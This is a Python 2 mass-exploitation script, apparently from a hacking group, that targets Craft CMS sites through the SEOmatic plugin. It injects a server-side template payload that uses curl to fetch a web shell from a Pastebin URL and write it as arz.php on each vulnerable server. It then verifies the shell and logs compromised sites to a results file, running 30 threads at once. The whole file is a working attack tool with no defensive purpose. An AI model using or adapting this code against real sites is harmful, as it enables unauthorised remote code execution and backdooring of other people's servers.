#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
C1 = "\033[1;36m"
G0 = "\033[0;32m"
W0 = "\033[0;37m"
R0 = "\033[0;31m"
import requests,sys,os
from multiprocessing.pool import ThreadPool
def check(target):
	try:
		r=requests.Session()
		cek=r.get(target+'/actions/seomatic/meta-container/all-meta-containers?uri=').text
		if 'MetaTitleContainer' in cek:
			r.get(target+'/actions/seomatic/meta-container/all-meta-containers?uri={{craft.app.view.evaluateDynamicContent(%27print(system("curl\x20https://pastebin.com/raw/cDs8XCZV\x20>\x20arz.php"));%27)}}')
			shel=r.get(target+'/arz.php')
			if 'SEA-GHOST MINSHELL' in shel.text:
				print '%s[ %ssuccess %s] %s/arz.php'%(W0,G0,W0,target)
				open('results.txt','a+').write(target+'/arz.php\n')
			else:
				print '%s[ %sfailed %s] %s'%(W0,R0,W0,target)
		else:
				print '%s[ %snot vuln %s] %s'%(W0,R0,W0,target)
	except:
		print '%s[ %sunk error %s] %s'%(W0,R0,W0,target)
		pass
try:
	os.system('clear')
	print '''%s
   ____________________
  / ___/ ___/_  __/  _/  %sCoded by D4RKSH4D0WS%s
  \__ \\\__ \ / /  / /    %sMass Upload Shell SSTI to RCE%s
 ___/ /__/ // / _/ /     %sIG @anonroz_team%s
/____/____//_/ /___/     %sFB gg.gg/AnonRoz-Team
'''%(C1,W0,C1,W0,C1,W0,C1,W0)
	ThreadPool(30).map(check,open(sys.argv[1]).read().splitlines())
	print '\n%s[%s  done  %s]  Saved in results.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] %sCheck internet'%(W0,R0,W0,W0))
except IndexError:
	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt with http/https'%(W0,R0,W0,W0,sys.argv[0],W0,R0,W0,W0))
except IOError:
	exit('%s[%s!%s] %sFile does not exist'%(W0,R0,W0,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] %sExit'%(W0,R0,W0,W0))
